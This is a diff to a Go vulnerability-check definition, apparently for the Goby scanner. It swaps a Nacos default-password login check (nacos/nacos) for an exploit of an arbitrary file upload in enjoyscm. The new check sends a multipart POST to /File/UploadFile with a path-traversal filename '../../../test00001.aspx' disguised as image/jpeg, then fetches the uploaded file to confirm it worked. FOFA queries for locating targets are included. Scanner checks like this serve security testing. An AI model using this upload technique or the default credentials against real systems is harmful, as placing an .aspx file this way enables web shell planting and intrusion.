@@ -6,14 +6,14 @@ import (
 
 func init() {
 	expJson := `{
-  "Name": "Alibaba Nacos 默认密码",
+  "Name": "enjoyscm UploadFile 任意文件上传漏洞",
   "Description": "",
-  "Product": "Nacos",
+  "Product": "",
   "Homepage": "",
   "DisclosureDate": null,
   "Author": "清晨",
-  "FofaQuery": "title=\"Nacos\"",
-  "GobyQuery": "title=\"Nacos\"",
+  "FofaQuery": "body=\"enjoy-alert\"",
+  "GobyQuery": "body=\"enjoy-alert\"",
   "Level": "3",
   "Impact": "",
   "Recommendation": "",
@@ -30,16 +30,37 @@ func init() {
     {
       "Request": {
         "method": "POST",
-        "uri": "/nacos/v1/auth/users/login",
+        "uri": "/File/UploadFile",
         "follow_redirect": true,
         "header": {
-          "Accept": "application/json, text/plain, */*",
-          "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
-          "Accept-Encoding": "gzip, deflate",
-          "Content-Type": "application/x-www-form-urlencoded"
+          "Content-Type": "multipart/form-data; boundary=---------------------------21909179191068471382830692394"
         },
         "data_type": "text",
-        "data": "username=nacos&password=nacos"
+        "data": "-----------------------------21909179191068471382830692394\nContent-Disposition: form-data; name=\"file\"; filename=\"../../../test00001.aspx\"\nContent-Type: image/jpeg\n\ntest_abcdefg00001\n-----------------------------21909179191068471382830692394\nContent-Disposition: form-data; name=\"action\"\n\nunloadfile\n-----------------------------21909179191068471382830692394\nContent-Disposition: form-data; name=\"filepath\"\n\n\n-----------------------------21909179191068471382830692394"
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "!=",
+            "value": "404",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": []
+    },
+    {
+      "Request": {
+        "method": "GET",
+        "uri": "/test00001.aspx",
+        "follow_redirect": true,
+        "header": {},
+        "data_type": "text",
+        "data": ""
       },
       "ResponseTest": {
         "type": "group",
@@ -56,7 +77,7 @@ func init() {
             "type": "item",
             "variable": "$body",
             "operation": "contains",
-            "value": "accessToken",
+            "value": "test_abcdefg00001",
             "bz": ""
           }
         ]
@@ -112,8 +133,8 @@ func init() {
   "CVSSScore": "",
   "Translation": {
     "CN": {
-      "Name": "Alibaba Nacos 默认密码",
-      "Product": "Nacos",
+      "Name": "enjoyscm UploadFile 任意文件上传漏洞",
+      "Product": "",
       "Description": "",
       "Recommendation": "",
       "Impact": "",
@@ -121,7 +142,7 @@ func init() {
       "Tags": []
     },
     "EN": {
-      "Name": "Alibaba Nacos Default password",
+      "Name": "enjoyscm UploadFile",
       "Product": "",
       "Description": "",
       "Recommendation": "",
